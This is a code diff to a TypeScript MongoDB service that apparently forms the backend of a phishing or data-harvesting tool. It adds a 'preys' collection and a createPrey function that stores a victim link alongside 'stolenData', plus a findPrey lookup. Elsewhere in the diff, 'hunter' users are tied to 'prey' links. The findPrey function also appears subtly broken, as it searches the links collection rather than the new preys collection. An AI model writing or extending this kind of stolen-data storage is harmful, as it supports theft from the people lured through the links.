@@ -2,17 +2,19 @@ import mongoDatabase from "../helper/mongodb.ts"
 import { Bson, Service, ObjectId } from "deps";
 import {} from "../model/mongoSchema.ts"
 //import {serviceCollection} from "./services.ts";
-import {UserSchema, LinkSchema} from "../model/mongoSchema.ts"
+import {UserSchema, LinkSchema, PreySchema} from "../model/mongoSchema.ts"
 
 const usersCollection = mongoDatabase.collection<UserSchema>("users")
 const linksCollection = mongoDatabase.collection<LinkSchema>("links")
+const preysCollection = mongoDatabase.collection<PreySchema>("preys")
 
 //@Service()
 class MongoService {
 
   constructor(
     private userCollection = usersCollection,
-    private linkCollection = linksCollection
+    private linkCollection = linksCollection,
+    private preyCollection = preysCollection
   ){}
 
   async createUser(_id: any, username: string, hashedPassword: string, placeHolder: string) {
@@ -29,7 +31,14 @@ class MongoService {
       return result;
   }
 
-    //TODO: We neeed a "CREATE" function to store the {praylink, stolen_data}
+  async createPrey(preyLink: string, stolenData: any) {
+    const result = await this.preyCollection.insertOne({
+        prey: preyLink,
+        stolenData: stolenData,
+      });
+      return result;
+  }  
+
     
   async createLinks(hunter: string, prey: string, action: string) {
     const result = await this.linkCollection.insertOne({
@@ -38,6 +47,16 @@ class MongoService {
         action: action,
       });
       return result;
+  }
+
+  async findPrey(link: string) {
+    let preyData = undefined;
+    try {
+      preyData = await this.linkCollection.findOne({ prey: { $in: [link] } });
+      return preyData;
+    } catch (error) {
+      error;
+    } 
   }
 
    // THIS SHOULD BE FINDING USERS EITHER BY EMAIL OR ID
